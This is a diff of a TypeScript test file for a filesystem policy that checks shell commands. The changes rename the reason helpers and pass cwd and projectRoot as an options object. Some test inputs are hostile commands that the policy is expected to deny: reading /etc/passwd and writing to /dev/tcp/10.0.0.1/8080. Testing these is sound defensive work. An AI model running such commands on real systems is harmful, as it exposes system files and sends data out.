@@ -3,8 +3,8 @@ import { homedir } from "node:os";
 
 import { filesystemPolicy } from "../src/policies/filesystem/policy.ts";
 import {
-  ASK_REASON,
-  INJECTION_REASON,
+  askReason,
+  injectionReason,
 } from "../src/policies/filesystem/reasons.ts";
 import { ALLOW, ASK, DENY } from "./fixtures/filesystem.ts";
 import { decisionOf, policyCheck, reasonOf } from "./helpers/policy.ts";
@@ -29,15 +29,15 @@ describe("filesystem policy v2", () => {
   it("allows reading the repo root from a package cwd (repo-in-$HOME scenario)", () => {
     const repo = `${homedir()}/www/repo`;
     expect(
-      policyCheck(
-        filesystemPolicy,
-        "cat ../../README.md",
-        `${repo}/packages/cli-hook`,
-        repo,
-      ),
+      policyCheck(filesystemPolicy, "cat ../../README.md", {
+        cwd: `${repo}/packages/cli-hook`,
+        projectRoot: repo,
+      }),
     ).toBeNull();
   });
+});
 
+describe("filesystem policy v2 (reasons)", () => {
   it("boundary denies quote the offending token", () => {
     expect(
       reasonOf(policyCheck(filesystemPolicy, "cat /etc/passwd")),
@@ -49,7 +49,7 @@ describe("filesystem policy v2", () => {
       reasonOf(
         policyCheck(filesystemPolicy, "echo x > /dev/tcp/10.0.0.1/8080"),
       ),
-    ).toContain(INJECTION_REASON("/dev/tcp/"));
+    ).toContain(injectionReason("/dev/tcp/"));
   });
 
   it("the /tmp deny reason teaches ./tmp/ at the project root", () => {
@@ -60,7 +60,7 @@ describe("filesystem policy v2", () => {
 
   it("the home-whole ask reason carries only the confirm instruction", () => {
     expect(reasonOf(policyCheck(filesystemPolicy, "ls ~"))).toBe(
-      ASK_REASON("reading the home directory as a whole", "~"),
+      askReason("reading the home directory as a whole", "~"),
     );
   });
 });
@@ -69,28 +69,27 @@ describe("context", () => {
   it("allows writes inside $HOME and inside projectRoot, denies outside the zone", () => {
     expect(
       decisionOf(
-        policyCheck(filesystemPolicy, "tee build/x x", "/proj/sub", "/proj"),
+        policyCheck(filesystemPolicy, "tee build/x x", {
+          cwd: "/proj/sub",
+          projectRoot: "/proj",
+        }),
       ),
     ).toBeNull();
     // projectRoot carves an allowed zone even outside $HOME
     expect(
       decisionOf(
-        policyCheck(
-          filesystemPolicy,
-          "tee /workspace/repo/x x",
-          "/workspace/repo",
-          "/workspace/repo",
-        ),
+        policyCheck(filesystemPolicy, "tee /workspace/repo/x x", {
+          cwd: "/workspace/repo",
+          projectRoot: "/workspace/repo",
+        }),
       ),
     ).toBeNull();
     expect(
       decisionOf(
-        policyCheck(
-          filesystemPolicy,
-          "tee /elsewhere/x x",
-          "/proj/sub",
-          "/proj",
-        ),
+        policyCheck(filesystemPolicy, "tee /elsewhere/x x", {
+          cwd: "/proj/sub",
+          projectRoot: "/proj",
+        }),
       ),
     ).toBe("deny");
   });
